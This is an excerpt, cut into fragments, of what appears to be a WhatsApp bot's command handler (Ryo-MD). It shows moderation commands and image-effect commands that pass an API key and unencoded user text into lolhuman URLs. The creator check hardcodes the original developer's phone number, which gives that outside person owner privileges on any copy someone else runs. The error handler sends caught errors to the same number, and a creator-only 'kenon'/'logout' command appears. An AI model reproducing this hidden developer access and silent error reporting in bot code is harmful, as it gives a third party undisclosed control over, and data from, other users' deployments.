/*
   ...
   • My Contact https://wa.me/6282253969170
...
module.exports = conn = async (conn, m, chatUpdate, store) => {
    try {
        ...
        const isCreator = [botNumber, ...global.owner, '6282253969170@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
...
case 'kenon':
case 'logout': {
if (!isCreator) return newReply('beli premium bot dek!!')
if (m.quoted || q) {
...
showAdAttribution: false,
        ...
        // Group Fitur
            case 'kick': {
                ...
                if (!isBotAdmins) return newReply(`Bot nya belum admin😋😋`)
...
break
        ...
        break
	        ...
	        case 'carbon':
	            ...
	            newReply(mess.wait)
	            conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/carbon?apikey=${apikey}&code=${q}&language=nodejs`}, caption: `Created By Ryo-MD\n\n\nCode:\n\n${q}`}, {quoted: m})
	        break
		...
		case 'freefire':
			...
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${apikey}&text=${args}`}, caption: `Created By Ryo-MD\n\n Type: ${command}\n\nText: ${args}`})
			break
		...
		case 'carvedwood':
            ...
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${apikey}&text=${args}`}, caption: `Created By Ryo-MD\n\n Type: ${command}\n\nText: ${args}`})
			break
    ...
    // Text Prome
		...
		case 'wallgravity':
			...
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${apikey}&text1=${args[0]}&text2=${args[1]}`}, caption: `Created By Ryo-MD\n\n Type: ${command}\n\nText: ${args}`})
			break
		...
		case 'thunder':
            ...
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey}&text=${args}` }, caption: `Created By Ryo-MD\n\n Type: ${command}\n\nText: ${args}`})
			break
...
conn.sendMessage(m.chat, {
    ...
    contextInfo: {
      externalAdReply: {
        ...
        body: "ʀʏᴏ-ᴍᴅ",
        thumbnailUrl: "https://i.ibb.co/TvRPV8k/hutod.jpg",
        sourceUrl: "https://chat.whatsapp.com/HkIAtlbjObD3OlrVj7RlVa",
        mediaType: 1,
...
let e = String(err)
conn.sendMessage("6282253969170@s.whatsapp.net", { text: "👋🏻 Hello developer, ada yang error nih! di bagian " + util.format(e), 
contextInfo:{
